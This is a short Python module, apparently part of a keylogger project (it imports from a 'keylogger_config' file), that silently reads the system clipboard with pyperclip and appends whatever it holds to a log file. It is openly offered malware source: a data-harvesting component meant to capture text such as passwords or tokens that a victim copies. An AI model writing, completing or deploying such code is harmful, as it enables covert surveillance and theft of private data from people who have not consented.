import pyperclip

from config.keylogger_config import CLIPBOARD_FILE_NAME


def get_clipboard_information(output_file_name=CLIPBOARD_FILE_NAME):
    with open(output_file_name, 'a') as file:
        try:
            clipboard_text = pyperclip.paste()
            file.write('\n\n### Clipboard data: ' + clipboard_text + ' ###\n')
        except Exception:
            file.write("Couldn't get clipboard information")


if __name__ == '__main__':
    get_clipboard_information()